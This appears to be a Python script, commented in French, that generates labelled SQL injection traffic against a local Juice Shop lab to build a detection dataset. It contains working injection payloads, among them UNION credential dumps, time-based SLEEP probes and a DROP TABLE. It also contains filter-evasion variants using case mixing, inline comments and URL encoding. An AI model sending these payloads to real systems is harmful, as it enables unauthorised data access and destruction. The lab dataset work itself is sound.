"""
attack_gen.py — Générateur de trafic d'injection (tâche M4 - Mouad)
--------------------------------------------------------------------
Envoie des requêtes d'attaque SQL vers le lab Juice Shop local (via le proxy
Nginx sur http://127.0.0.1:8080), avec les en-têtes requis par Salma :
  - X-Label: 1            (toujours, sur CHAQUE requête d'attaque)
  - X-Scenario: ...        (type d'attaque : sqli_search, sqli_login, etc.)
  - X-Run: m4_runX         (à changer à chaque lot envoyé)

Ne touche JAMAIS à ce script pour envoyer du trafic normal : c'est le rôle
de Salma. Ici, tout a X-Label: 1.
"""

import requests
import random
import time
import csv
import itertools
import os

random.seed(42)  # reproductibilité

BASE_URL = "http://127.0.0.1:8080"
RUN_ID = "m4_run11"          # <-- CHANGE CECI à chaque nouveau lot (m4_run2, m4_run3...)
DELAY_BETWEEN_REQUESTS = 0.05  # secondes, pour ne pas spammer le lab trop vite

# Journal local de ce que TU as envoyé (indépendant du log Nginx), utile pour
# la relecture croisée et pour vérifier le volume par scénario.
# Chemin ANCRÉ sur le dossier du script lui-même (peu importe d'où tu lances
# "python attack_gen.py"), pour que ce soit TOUJOURS le même fichier unique.
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
SENT_LOG_PATH = os.path.join(SCRIPT_DIR, "sent_requests_log.csv")


def send(method, path, scenario, **kwargs):
    """
    Envoie une requête d'attaque avec les 3 en-têtes obligatoires.
    `scenario` doit être une des valeurs convenues avec Salma, ex :
    sqli_search, sqli_login, sqli_register, sqli_trackorder,
    sqli_variant_case, sqli_variant_comment, sqli_variant_urlenc, sqli_sqlmap
    """
    headers = kwargs.pop("headers", {})
    headers["X-Label"] = "1"       # jamais écrasable
    headers["X-Scenario"] = scenario
    headers["X-Run"] = RUN_ID

    try:
        resp = requests.request(
            method, BASE_URL + path, headers=headers, timeout=10, **kwargs
        )
        status = resp.status_code
    except requests.RequestException as e:
        status = f"ERROR:{e}"

    file_exists = os.path.isfile(SENT_LOG_PATH)
    with open(SENT_LOG_PATH, "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(["run_id", "scenario", "method", "path", "status"])
        writer.writerow([RUN_ID, scenario, method, path, status])

    time.sleep(DELAY_BETWEEN_REQUESTS)
    return status


# ---------------------------------------------------------------------------
# 1. Payloads de BASE pour le jeu de TEST (ne jamais réutiliser dans "replay")
# ---------------------------------------------------------------------------
BASE_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "admin'--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT null,username,password FROM users--",
    "1' AND SLEEP(2)--",
    "' OR SLEEP(2)--",
    "'; DROP TABLE users--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
]


# ---------------------------------------------------------------------------
# 2. Générateur de VARIANTES (casse, commentaires, encodage)
#    Chaque variante a son propre X-Scenario pour l'analyse d'erreurs.
# ---------------------------------------------------------------------------
def variant_case(payload):
    """Casse mélangée aléatoire."""
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)


def variant_inline_comment(payload):
    """Insère des commentaires MySQL inline dans les mots-clés SQL."""
    for kw in ["UNION", "SELECT", "OR", "AND"]:
        if kw in payload.upper():
            # remplace la 1re occurrence insensible à la casse par une version commentée
            idx = payload.upper().find(kw)
            payload = payload[:idx] + kw[0] + "/**/" + kw[1:] + payload[idx + len(kw):]
    return payload


def variant_url_encode(payload, double=False):
    from urllib.parse import quote
    enc = quote(payload, safe="")
    return quote(enc, safe="") if double else enc


def variant_space_replace(payload):
    return payload.replace(" ", random.choice(["+", "%09", "/**/"]))


# ---------------------------------------------------------------------------
# 3. Scénarios : mêmes endpoints que le trafic normal de Salma
# ---------------------------------------------------------------------------
def run_search_attacks():
    for p in BASE_PAYLOADS:
        send("GET", "/rest/products/search", "sqli_search", params={"q": p})


def run_login_attacks():
    for p in BASE_PAYLOADS:
        send("POST", "/rest/user/login", "sqli_login",
             json={"email": p, "password": "x"})


def run_register_attacks():
    for p in BASE_PAYLOADS:
        send("POST", "/api/Users", "sqli_register",
             json={"email": p, "password": "Passw0rd!"})


def run_trackorder_attacks():
    for p in BASE_PAYLOADS:
        send("GET", f"/rest/track-order/{p}", "sqli_trackorder")


def run_variants():
    for p in BASE_PAYLOADS:
        send("GET", "/rest/products/search", "sqli_variant_case",
             params={"q": variant_case(p)})
        send("GET", "/rest/products/search", "sqli_variant_comment",
             params={"q": variant_inline_comment(p)})
        send("GET", "/rest/products/search", "sqli_variant_urlenc",
             params={"q": variant_url_encode(p)})
        send("GET", "/rest/products/search", "sqli_variant_urlenc_double",
             params={"q": variant_url_encode(p, double=True)})
        send("GET", "/rest/products/search", "sqli_variant_space",
             params={"q": variant_space_replace(p)})


if __name__ == "__main__":
    print(f"=== Lancement du lot {RUN_ID} ===")
    run_search_attacks()
    run_login_attacks()
    run_register_attacks()
    run_trackorder_attacks()
    run_variants()
    print(f"Terminé. Détail envoyé dans {SENT_LOG_PATH}")
    print("Vérifie maintenant logs\\lab.log pour confirmer que tout est bien journalisé.")
